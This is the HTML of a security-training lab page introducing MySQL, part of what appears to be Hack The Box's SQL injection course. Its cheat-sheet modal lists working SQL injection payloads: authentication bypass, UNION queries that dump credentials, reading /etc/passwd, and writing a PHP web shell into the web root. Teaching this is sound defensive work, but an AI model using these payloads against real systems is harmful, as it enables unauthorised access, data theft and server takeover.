        <p class="mb-0">Note: Allow 10-15 seconds for the servers in the questions to start, to allow enough time for Apache/MySQL to initiate and run.</p>
    </div>
</div>

            
            
            <div class="mb-5 pwnbox-select-card"><wc-htb-pwnbox-selection-card regions="[{&quot;name&quot;:&quot;UK&quot;,&quot;value&quot;:&quot;uk&quot;,&quot;latency&quot;:106},{&quot;name&quot;:&quot;US EAST&quot;,&quot;value&quot;:&quot;us-east&quot;,&quot;latency&quot;:556},{&quot;name&quot;:&quot;US WEST&quot;,&quot;value&quot;:&quot;us-west&quot;,&quot;latency&quot;:813},{&quot;name&quot;:&quot;DE&quot;,&quot;value&quot;:&quot;de&quot;,&quot;latency&quot;:245},{&quot;name&quot;:&quot;IN&quot;,&quot;value&quot;:&quot;in&quot;,&quot;latency&quot;:1328},{&quot;name&quot;:&quot;SG&quot;,&quot;value&quot;:&quot;sg&quot;,&quot;latency&quot;:1037},{&quot;name&quot;:&quot;CA&quot;,&quot;value&quot;:&quot;ca&quot;,&quot;latency&quot;:1500},{&quot;name&quot;:&quot;AU&quot;,&quot;value&quot;:&quot;au&quot;,&quot;latency&quot;:1449}]" current-pwnbox="{&quot;title&quot;:&quot;DE&quot;,&quot;value&quot;:&quot;de&quot;,&quot;proxyLatencyURL&quot;:&quot;https://proxy-de.htb-cloud.com/latency_pixel.png&quot;}"></wc-htb-pwnbox-selection-card></div>

            <div id="screen" style="height: 600px; border: 1px solid;">
                <div class="screenPlaceholder">
                    <div class="instanceLoading" style="display: none;">
                        <h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
                        </h1>
                        <div class="text-center">Instance is starting...</div>
                    </div>
                    <div class="instanceTerminating" style="display: none;">
                        <h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
                        </h1>
                        <div class="text-center">Terminating instance...</div>
                    </div>
                    <div class="row instanceStart max-width-canvas">
                        <div class="col-4"></div>
                        <div class="col-4">
                            <button class="startInstanceBtn btn btn-success text-light btn-lg btn-block " style="margin-top: 270px;">Start Instance
                            </button>
                            <p class="text-center mt-2 font-size-13 font-secondary">
                                <span class="text-success spawnsLeft">
                                                                        <i class="fal fa-infinity"></i>
                                                                    </span> / 1 spawns left
                            </p>
                        </div>
                        <div class="col-4"></div>
                    </div>
                </div>
            </div>
            <div class="row align-center justify-center my-4">
                <div class="col-5 justify-start">
                    <button style="display:none;" target="_blank" class="instance-button fullScreenBtn btn btn-light btn-sm float-left "><i class="fad fa-expand text-success mr-1"></i> &nbsp;Full Screen
                    </button>
                    <button style="display:none;" class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2"><i class="fad fa-times text-danger"></i> &nbsp;Terminate
                    </button>
                    <button style="display:none;" class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1"><i class="fad fa-sync text-warning mr-2"></i> &nbsp;Reset
                    </button>
                    <div class="btn-group " role="group">
                        <button style="display:none;cursor: default;" class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
                                                <button style="display:none;" data-toggle="tooltip" data-title="Extend Life" class=" extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm " data-original-title="" title=""><i class="fa fa-plus text-success"></i></button>
                                            </div>
                </div>

                <div id="statusText" class="col-7 justify-end pt-2 pr-2 font-size-small text-right">Waiting to
                    start...
                </div>
            </div>
                                                    <div id="solutionsModuleSetting" class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets">
                    <div class="border border-secondary p-2 rounded">
                        <div class="custom-control custom-switch d-flex">
                            <input type="checkbox" class="custom-control-input" id="showSolutionsModuleSetting">
                            <label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
                                                    </div>
                    </div>
                </div>
                        <div class="card" id="questionsDiv">
                <div class="card-body">
                    <div class="row">
                        <div class="col-9">
                            <h4 class="card-title mt-0 font-size-medium">Questions</h4>
                            <p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
                                                        <span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
                            <p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
        <span class="target" style="cursor:pointer;"><span class="spawnTargetBtn" style="cursor:pointer;">Click here to spawn the target system!</span></span>
    </span>
    <button class="resetTargetBtn btn btn-light btn-sm" data-toggle="tooltip" data-title="Reset Target(s)" style="cursor: pointer; display: none;" data-original-title="" title="" disabled="">
        <i class="fad fa-sync text-warning"></i>
    </button>
    <br>
    </p><div class="d-flex align-items-center targetLifeContainer">
        <span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                    </span>
    </div>
<p></p>
                                                    </div>
                        <div class="col-3 text-right float-right">
                                                        <button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-toggle="modal" data-target="#cheatSheetModal">
                                <div><i class="fad fa-file-alt mr-2"></i></div>
                                <div class="text-center w-100 ml-1">Cheat Sheet</div>
                            </button>
                                                                                </div>

                    </div>
                    <div>
                                                <div>
                                                        <p class="mb-0 font-size-12"><i class="fad fa-chart-network text-success mr-2 font-size-medium"></i>
                                Authenticate
                                to <span class="target-protocol-ip target-protocol-ip-460 text-dark"></span> with user "<span class="text-success">root</span>" and
                                password "<span class="text-danger">password</span>" </p>
                                                        <label class="module-question" for="460"><span class="badge badge-soft-dark font-size-14 mr-2">+ 0 <i class="fad fa-cube text-success"></i></span> Connect to the database using the MySQL client from the command line. Use the 'show databases;' command to list databases in the DBMS. What is the name of the first database?
                            </label>

                            <div class="row">
                                <div class="col-lg-12 mb-4">
                                                                        <input class="form-control bg-color-blue-nav" id="answer460" type="text" color="green" placeholder="Submit your answer here..." maxlength="191">
                                                                    </div>
                                <div class="d-flex justify-content-end w-100 mr-3">
                                                                        <p id="questionStreakPointsText-460" class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white">
                                        +10 Streak pts</p>
                                                                        <div class="mb-4 mr-1 d-flex align-items-center">
                                        <button class="btn btn-primary btn-block btnAnswer" id="btnAnswer460" data-question-id="460">
                                            <div class="submit-button-text">
                                                <i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
                                            <div class="submit-button-loader mx-4 d-none">
                                                <i class="fa fa-circle-notch fa-spin"></i>
                                            </div>
                                        </button>
                                    </div>
                                    
                                                                        <div class="mb-4  mr-1">
                                        <button class="btn btn-outline-warning btn-block" data-toggle="modal" id="hintBtn460" data-target="#hint460"><i class="fad fa-life-ring mr-2"></i> Hint
                                        </button>
                                    </div>
                                    
                                                                        <div id="showSolutionBtn" class="mb-4 mr-1">
                                        <button class="btn btn-success d-flex align-items-center w-100 color-dark" onclick="openWalkthroughModal(&quot;0&quot;,&quot;Intro to MySQL&quot;)">
                                            <i class="fa fa-book mr-2"></i> Show Solution
                                        </button>
                                    </div>
                                                                    </div>

                            </div>
                            <div class="">
                            </div>
                        </div>
                                            </div>
                </div>
            </div>
                                </div>

        <div class="card bg-color-blue-nav" style="margin: 30px 0">
            <div class="card-body">
                                <a href="https://academy.hackthebox.com/module/33/section/182" class="btn btn-light module-button py-2" style="float: left"><i class="fa fa-arrow-alt-left mr-1"></i> Previous</a>
                                                                <form action="https://academy.hackthebox.com/module" method="POST" class="form-inline" id="completeForm" style="float: right">
                    <input type="hidden" name="module_id" value="33">
                    <input type="hidden" name="page_id" value="5">
                    <input type="hidden" name="completed" value="1">
                                        <p id="completeBtnPoints" class="mb-0 mr-3 font-size-14 font-medium text-white d-none">
                        +10 Streak pts</p>
                                        <button id="completeBtn" class="btn btn-outline-success" style="display: none;">
                        <div id="complete-button-text">
                            <i class="fa fa-check-circle"></i> Mark Complete &amp; Next
                        </div>
                        <div id="complete-button-loader" class="mx-5 d-none">
                            <i class="fa fa-circle-notch fa-spin"></i>
                        </div>
                    </button>
                </form>
                
                <a href="https://academy.hackthebox.com/module/33/section/190" class="btn btn-light ml-2 module-button py-2" style="float: left">Next <i class="ml-1 fa fa-arrow-alt-right"></i></a>
                            </div>
        </div>
    </div>
    <div class="col-md-12 col-xl-3 col-xxl-3">
        <div id="table-of-contents">

                        <div class="card">
                <div class="card-body bg-color-blue-nav">
                                        <button class="btn btn-light btn-block module-button" data-toggle="modal" data-target="#cheatSheetModal"><i class="fad fa-file-alt mr-2"></i> Cheat Sheet
                    </button>
                                                                                <a href="#questionsDiv" class="btn btn-light btn-block module-button"><i class="fad fa-question mr-2"></i> Go to Questions</a>
                                    </div>
            </div>
                        <div class="card" id="TOC">
                <div class="card-body bg-color-blue-nav">
                    <h5 class="card-title font-size-15 mb-4">Table of Contents</h5>
                                                            <a href="https://academy.hackthebox.com/module/33/section/177" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
                                                <span class="font-size-13">Introduction</span>
                                                                                                <i class="fad fa-check-square text-success float-right mt-1" style="top: 2px"></i>
                                                                    </a>
                                         <h6 class="mt-4 mb-2">Databases</h6>                     <a href="https://academy.hackthebox.com/module/33/section/178" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
                                                <span class="font-size-13">Intro to Databases</span>
                                                                                                <i class="fad fa-check-square text-success float-right mt-1" style="top: 2px"></i>
                                                                    </a>
                                                            <a href="https://academy.hackthebox.com/module/33/section/182" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
                                                <span class="font-size-13">Types of Databases</span>
                                                                                                <i class="fad fa-check-square text-success float-right mt-1" style="top: 2px"></i>
                                                                    </a>
                                         <h6 class="mt-4 mb-2">MySQL</h6>                     <a href="https://academy.hackthebox.com/module/33/section/183" class="btn   text-primary  btn-sm btn-block mt-1 py-2 text-left btn-lighter">
                                                <i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
                                                <span class="font-size-13">Intro to MySQL</span>
                                                                    </a>
                                                            <a href="https://academy.hackthebox.com/module/33/section/190" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
                                                <i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
                                                <span class="font-size-13">SQL Statements</span>
                                                                    </a>
                                                            <a href="https://academy.hackthebox.com/module/33/section/191" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
                                                <i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
                                                <span class="font-size-13">Query Results</span>
                                                                    </a>
                                                            <a href="https://academy.hackthebox.com/module/33/section/192" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
                                                <i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
                                                <span class="font-size-13">SQL Operators</span>
                                                                    </a>
                                         <h6 class="mt-4 mb-2">SQL Injections</h6>                     <a href="https://academy.hackthebox.com/module/33/section/193" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
                                                <span class="font-size-13">Intro to SQL Injections</span>
                                                                    </a>
                                                            <a href="https://academy.hackthebox.com/module/33/section/194" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
                                                <i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
                                                <span class="font-size-13">Subverting Query Logic</span>
                                                                    </a>
                                                            <a href="https://academy.hackthebox.com/module/33/section/799" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
                                                <i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
                                                <span class="font-size-13">Using Comments</span>
                                                                    </a>
                                                            <a href="https://academy.hackthebox.com/module/33/section/806" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
                                                <i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
                                                <span class="font-size-13">Union Clause</span>
                                                                    </a>
                                                            <a href="https://academy.hackthebox.com/module/33/section/216" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
                                                <i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
                                                <span class="font-size-13">Union Injection</span>
                                                                    </a>
                                         <h6 class="mt-4 mb-2">Exploitation</h6>                     <a href="https://academy.hackthebox.com/module/33/section/217" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
                                                <i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
                                                <span class="font-size-13">Database Enumeration</span>
                                                                    </a>
                                                            <a href="https://academy.hackthebox.com/module/33/section/792" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
                                                <i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
                                                <span class="font-size-13">Reading Files</span>
                                                                    </a>
                                                            <a href="https://academy.hackthebox.com/module/33/section/793" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
                                                <i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
                                                <span class="font-size-13">Writing Files</span>
                                                                    </a>
                                         <h6 class="mt-4 mb-2">Mitigations</h6>                     <a href="https://academy.hackthebox.com/module/33/section/794" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
                                                <span class="font-size-13">Mitigating SQL Injection</span>
                                                                    </a>
                                         <h6 class="mt-4 mb-2">Closing it Out</h6>                     <a href="https://academy.hackthebox.com/module/33/section/518" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
                                                <i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
                                                <span class="font-size-13">Skills Assessment - SQL Injection Fundamentals</span>
                                                                    </a>
                                    </div>
            </div>
            <div class="card">
                <div class="card-body bg-color-blue-nav">
                    <h5 class="card-title mb-4">My Workstation</h5>
                    <div class="row">
                        <div class="col-12">
                            <div id="sidePreview" style="height: 160px; border: 1px solid #323232; border-radius: 5px; background-color: #0a121c; text-align: center">
                                <div class="screenPlaceholder">
                                    <p class="instanceStart" style="padding-top:70px; letter-spacing: 5px;">
                                        OFFLINE</p>
                                    <p class="instanceLoading " style="padding-top:70px; display: none"><i class="fa fa-circle-notch fa-spin"></i> Starting...</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-12 mt-2">
                            <div class="instanceStart">
                                <button class="startInstanceBtn btn btn-success text-light btn-sm mt-2 btn-block module-button py-2  ">
                                    <i class="fad fa-play-circle text-light"></i> &nbsp;Start Instance
                                </button>
                                <p class="text-center mt-2 font-size-13 font-secondary">
                                    <span class="text-success spawnsLeft">
                                                                                <i class="fal fa-infinity"></i>
                                                                            </span> / 1 spawns left
                                </p>
                            </div>
                            <button style="display:none;" class="fullScreenBtn btn btn-light btn-sm mt-2 module-button py-2"><i class="fad fa-expand text-success"></i> &nbsp;Interact
                            </button>
                            <button style="display:none;" class="terminateInstanceBtn btn btn-light btn-sm mt-2 module-button py-2"><i class="fad fa-times text-danger"></i> &nbsp;Terminate
                            </button>
                            <button style="display:none;" class="resetInstanceBtn btn btn-light btn-sm mt-2 module-button py-2"><i class="fad fa-sync text-warning"></i> &nbsp;Reset
                            </button>
                            <div class="btn-group" role="group">
                                <button style="display:none; cursor: default;" class=" extendInstanceBtn btn btn-light btn-sm mt-2 module-button py-2">Life
                                    Left: <span class="lifeLeft"></span>m
                                </button>
                                                                <button style="display:none;" data-toggle="tooltip" data-title="Extend Life" class=" extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm mt-2 module-button py-2" data-original-title="" title="">
                                    <i class="fa fa-plus text-success"></i></button>
                                                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

</div>

<div id="hint460" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="hint460" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content">
            <div class="modal-body">
                <div class="text-center">
                    <h5><i class="fad fa-life-ring text-success"></i>&nbsp; Hint</h5>
                    <br>
                    <h6>Make sure to specify the non-default MySQL port in your command.</h6>
                </div>
            </div>
        </div>
    </div>
</div>


<div id="cheatSheetModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="unlockModuleModal" aria-hidden="true">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-body">
                <div class="text-center text-break">
                    <h5><i class="fad fa-file-alt"></i>&nbsp; Cheat Sheet</h5>
                    <p>The cheat sheet is a useful command reference for this module.</p>
                    <h2>MySQL</h2>
<div class="table-responsive"><table class="table table-striped text-left">
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>General</strong></td>
<td></td>
</tr>
<tr>
<td><code>mysql -u root -h docker.hackthebox.eu -P 3306 -p</code></td>
<td>login to mysql database</td>
</tr>
<tr>
<td><code>SHOW DATABASES</code></td>
<td>List available databases</td>
</tr>
<tr>
<td><code>USE users</code></td>
<td>Switch to database</td>
</tr>
<tr>
<td><strong>Tables</strong></td>
<td></td>
</tr>
<tr>
<td><code>CREATE TABLE logins (id INT, ...)</code></td>
<td>Add a new table</td>
</tr>
<tr>
<td><code>SHOW TABLES</code></td>
<td>List available tables in current database</td>
</tr>
<tr>
<td><code>DESCRIBE logins</code></td>
<td>Show table properties and columns</td>
</tr>
<tr>
<td><code>INSERT INTO table_name VALUES (value_1,..)</code></td>
<td>Add values to table</td>
</tr>
<tr>
<td><code>INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)</code></td>
<td>Add values to specific columns in a table</td>
</tr>
<tr>
<td><code>UPDATE table_name SET column1=newvalue1, ... WHERE &lt;condition&gt;</code></td>
<td>Update table values</td>
</tr>
<tr>
<td><strong>Columns</strong></td>
<td></td>
</tr>
<tr>
<td><code>SELECT * FROM table_name</code></td>
<td>Show all columns in a table</td>
</tr>
<tr>
<td><code>SELECT column1, column2 FROM table_name</code></td>
<td>Show specific columns in a table</td>
</tr>
<tr>
<td><code>DROP TABLE logins</code></td>
<td>Delete a table</td>
</tr>
<tr>
<td><code>ALTER TABLE logins ADD newColumn INT</code></td>
<td>Add new column</td>
</tr>
<tr>
<td><code>ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn</code></td>
<td>Rename column</td>
</tr>
<tr>
<td><code>ALTER TABLE logins MODIFY oldColumn DATE</code></td>
<td>Change column datatype</td>
</tr>
<tr>
<td><code>ALTER TABLE logins DROP oldColumn</code></td>
<td>Delete column</td>
</tr>
<tr>
<td><strong>Output</strong></td>
<td></td>
</tr>
<tr>
<td><code>SELECT * FROM logins ORDER BY column_1</code></td>
<td>Sort by column</td>
</tr>
<tr>
<td><code>SELECT * FROM logins ORDER BY column_1 DESC</code></td>
<td>Sort by column in descending order</td>
</tr>
<tr>
<td><code>SELECT * FROM logins ORDER BY column_1 DESC, id ASC</code></td>
<td>Sort by two-columns</td>
</tr>
<tr>
<td><code>SELECT * FROM logins LIMIT 2</code></td>
<td>Only show first two results</td>
</tr>
<tr>
<td><code>SELECT * FROM logins LIMIT 1, 2</code></td>
<td>Only show first two results starting from index 2</td>
</tr>
<tr>
<td><code>SELECT * FROM table_name WHERE &lt;condition&gt;</code></td>
<td>List results that meet a condition</td>
</tr>
<tr>
<td><code>SELECT * FROM logins WHERE username LIKE 'admin%'</code></td>
<td>List results where the name is similar to a given string</td>
</tr>
</tbody>
</table></div>
<h2>MySQL Operator Precedence</h2>
<ul>
<li>Division (<code>/</code>), Multiplication (<code>*</code>), and Modulus (<code>%</code>)</li>
<li>Addition (<code>+</code>) and Subtraction (<code>-</code>)</li>
<li>Comparison (<code>=</code>, <code>&gt;</code>, <code>&lt;</code>, <code>&lt;=</code>, <code>&gt;=</code>, <code>!=</code>, <code>LIKE</code>)</li>
<li>NOT (<code>!</code>)</li>
<li>AND (<code>&amp;&amp;</code>)</li>
<li>OR (<code>||</code>)</li>
</ul>
<h2>SQL Injection</h2>
<div class="table-responsive"><table class="table table-striped text-left">
<thead>
<tr>
<th><strong>Payload</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Auth Bypass</strong></td>
<td></td>
</tr>
<tr>
<td><code>admin' or '1'='1</code></td>
<td>Basic Auth Bypass</td>
</tr>
<tr>
<td><code>admin')-- -</code></td>
<td>Basic Auth Bypass With comments</td>
</tr>
<tr>
<td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass">Auth Bypass Payloads</a></td>
<td></td>
</tr>
<tr>
<td><strong>Union Injection</strong></td>
<td></td>
</tr>
<tr>
<td><code>' order by 1-- -</code></td>
<td>Detect number of columns using <code>order by</code></td>
</tr>
<tr>
<td><code>cn' UNION select 1,2,3-- -</code></td>
<td>Detect number of columns using Union injection</td>
</tr>
<tr>
<td><code>cn' UNION select 1,@@version,3,4-- -</code></td>
<td>Basic Union injection</td>
</tr>
<tr>
<td><code>UNION select username, 2, 3, 4 from passwords-- -</code></td>
<td>Union injection for 4 columns</td>
</tr>
<tr>
<td><strong>DB Enumeration</strong></td>
<td></td>
</tr>
<tr>
<td><code>SELECT @@version</code></td>
<td>Fingerprint MySQL with query output</td>
</tr>
<tr>
<td><code>SELECT SLEEP(5)</code></td>
<td>Fingerprint MySQL with no output</td>
</tr>
<tr>
<td><code>cn' UNION select 1,database(),2,3-- -</code></td>
<td>Current database name</td>
</tr>
<tr>
<td><code>cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</code></td>
<td>List all databases</td>
</tr>
<tr>
<td><code>cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -</code></td>
<td>List all tables in a specific database</td>
</tr>
<tr>
<td><code>cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -</code></td>
<td>List all columns in a specific table</td>
</tr>
<tr>
<td><code>cn' UNION select 1, username, password, 4 from dev.credentials-- -</code></td>
<td>Dump data from a table in another database</td>
</tr>
<tr>
<td><strong>Privileges</strong></td>
<td></td>
</tr>
<tr>
<td><code>cn' UNION SELECT 1, user(), 3, 4-- -</code></td>
<td>Find current user</td>
</tr>
<tr>
<td><code>cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -</code></td>
<td>Find if user has admin privileges</td>
</tr>
<tr>
<td><code>cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -</code></td>
<td>Find if all user privileges</td>
</tr>
<tr>
<td><code>cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -</code></td>
<td>Find which directories can be accessed through MySQL</td>
</tr>
<tr>
<td><strong>File Injection</strong></td>
<td></td>
</tr>
<tr>
<td><code>cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -</code></td>
<td>Read local file</td>
</tr>
<tr>
<td><code>select 'file written successfully!' into outfile '/var/www/html/proof.txt'</code></td>
<td>Write a string to a local file</td>
</tr>
<tr>
<td><code>cn' union select "",'&lt;?php system($_REQUEST[0]); ?&gt;', "", "" into outfile '/var/www/html/shell.php'-- -</code></td>
<td>Write a web shell into the base web directory</td>
</tr>
</tbody>
</table></div>

                </div>
            </div>
            <div class="modal-footer">
                <a class="btn btn-light btn-block" href="https://academy.hackthebox.com/module/cheatsheet/33">Download
                    Cheatsheet</a>
            </div>
        </div>
    </div>
</div>


<div id="linkDiscordModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="linkDiscordModal" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content">
            <div class="modal-header text-center">
                            <h5 class="modal-title w-100">Do you need help with this question?</h5>
                        </div>
            <div class="modal-body">
                <div class="text-center">
                    <img src="/images/icons/discord-alternative.svg" alt="discord icon">
                    <p class="mb-1">It looks like you have not linked your Discord account!</p>
                    <p>You can receive question guidance via Discord. </p>
                    <a href="https://academy.hackthebox.com/account/discord/link" class="btn btn-outline-success btn-block">
                        Link your Discord account
                    </a>
                </div>
            </div>
        </div>
    </div>
</div><div id="referralModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="referralModal" aria-hidden="true" data-backdrop="static">
    <div class="modal-dialog modal-dialog-centered" role="document">
        <div class="modal-content">
            <div class="modal-header text-center border-0">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true"><img src="/images/close.svg" alt="close"></span>
                </button>
            </div>
            <div class="modal-body">
                <div class="text-center">
                    <img src="/images/htb-coin.svg" alt="coin icon">
                    <h1 class="text-white">Refer &amp; Earn</h1>
                    <p class="text-secondary font-size-20">
                        Refer a Friend, Earn Cubes, Unlock Academy Modules!
                    </p>
                    <div class="d-flex flex-column">
                        <a href="/referral">
                            <button type="button" class="btn btn-success btn-invite-friend text-light my-4">
                                Invite Friends
                            </button>
                        </a>
                        <button type="button" id="disableReferralModalBtn" onclick="disableModalRedisplay()" class="btn mt-2 mb-3 d-none">
                            Don't show it again
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div><div id="pwnboxSwitchWarningModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="pwnboxSwitchWarningModal" aria-hidden="true" data-backdrop="static">
    <div class="modal-dialog modal-dialog-centered" role="document">
        <div class="modal-content">
            <div class="modal-header text-center">
                <h2 class="d-inline-flex align-items-center text-white"><span class="font-size-18"><i class="far fa-exclamation-triangle text-danger mr-2"></i></span>Warning</h2>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true"><img src="/images/close.svg" alt="close" height="16" width="16"></span>
                </button>
            </div>
            <div class="modal-body pt-0">
                <div class="text-left">
                    <h1 class="text-white"></h1>
                    <div class="text-secondary font-size-14 px-2">
                        <p>
                            The current instance of Pwnbox <span class="font-medium text-white">will be terminated</span>   when switching to a new region.
                        </p>
                        <p>
                            <span class="font-medium text-white">All progress you've made will be lost.</span>  Do you want to continue?
                        </p>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" id="cancelPwnboxSwitchBtn" class="btn cancel-btn px-5">
                    Cancel
                </button>
                <button type="button" id="continuePwnboxSwitchBtn" class="btn continue-btn px-5 text-light">
                    <span id="continuePwnboxSwitchBtnText">Continue</span>
                    <div class="pwnboxSwitchModalLoader spinner-border d-none" role="status">
                        <span class="sr-only">Switching VPN...</span>
                    </div>
                </button>
            </div>
        </div>
    </div>
</div><div id="vpnSwitchWarningModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="vpnSwitchWarningModal" aria-hidden="true" data-backdrop="static">
    <div class="modal-dialog modal-dialog-centered" role="document">
        <div class="modal-content">
            <div class="modal-header text-center">
                <h2 class="d-inline-flex align-items-center text-white"><span class="font-size-18"><i class="far fa-exclamation-triangle text-danger mr-2"></i></span>Warning</h2>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true"><img src="/images/close.svg" alt="close" height="16" width="16"></span>
                </button>
            </div>
            <div class="modal-body pt-0">
                <div class="text-left">
                    <h1 class="text-white"></h1>
                    <div class="text-secondary font-size-14 px-2">
                        <p>
                            All VM instances associated with the old VPN Server <span class="font-medium text-white">will be terminated</span> when switching to
                            a new VPN server. Existing PwnBox instances
                            <span class="font-medium text-white">will automatically switch</span>
                            to the new VPN server.
                        </p>
                        <p>
                            <span class="font-medium text-white">All progress you've made, will
                                be lost,</span> do you want to continue?
                        </p>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" id="cancelVpnSwitchBtn" class="btn cancel-btn px-5">
                    Cancel
                </button>
                <button type="button" id="continueVpnSwitchBtn" class="btn continue-btn px-5 text-light">
                    <span id="continueVpnSwitchBtnText">Continue</span>
                    <div class="vpnSwitchModalLoader spinner-border d-none" role="status">
                        <span class="sr-only">Switching VPN...</span>
                    </div>
                </button>
            </div>
        </div>
    </div>
</div><div id="solutionPreferencesModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="solutionPreferencesModal" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content pt-4 pl-4 pr-4 pb-3">
            <div class="modal-header text-center flex-column align-items-center p-0 font-size-18 font-bold">
                <img src="/images/icons/contact-support.svg" alt="contact support icon">
                <h5 class="modal-title w-100 text-white mt-2">Do you need help with this question?</h5>
            </div>
            <div class="modal-body p-0 mt-2 font-size-16">
                <div class="text-center">
                    <p class="mb-0">You have the option to enable step-by-step solutions for all questions.</p>
                    <p class="mb-0">You can manage this preference at any time through your profile settings.</p>
                </div>
            </div>
            <div class="modal-footer align-items-center justify-content-center p-0 mt-4 gap-12">
                <button class="btn btn-outline-secondary text-white font-medium" onclick="handleSolutionPreferencesModalAction(false)">
                    Don't show Solutions
                </button>
                <button class="btn btn-success text-light font-medium" onclick="handleSolutionPreferencesModalAction(true)">
                    Activate Solutions
                </button>
            </div>
        </div>
    </div>
</div>

<div class="streaks-container">
    </div>
<div id="walkthroughModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="walkthroughModal" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered modal-lg">
        <div class="modal-content">
            <div class="modal-header text-center">
                <h5 class="modal-title w-100">Walkthrough</h5>
            </div>
            <div class="modal-body">
                <div class="spinner-border text-success walkthrough-loader d-none d-block mx-auto" role="status">
                    <span class="sr-only">Loading...</span>
                </div>
                <div class="training-module d-none">
                    <h1>SQL Injection Fundamentals Module</h1>
<h2>Section Questions Writeup</h2>
<h4><strong>Tier</strong>: 0</h4>
<h4><strong>Difficulty</strong>: Medium</h4>
<h4><strong>Type</strong>: Offensive</h4>
<h4><strong>Created By</strong>: 21y4d</h4>
<h4><strong>Co-Authors</strong>: -</h4>
<h2>Acronyms Used in Writeups</h2>
<div class="table-responsive"><table class="table table-striped text-left">
<thead>
<tr>
<th align="center">Acronym</th>
<th align="center">Meaning</th>
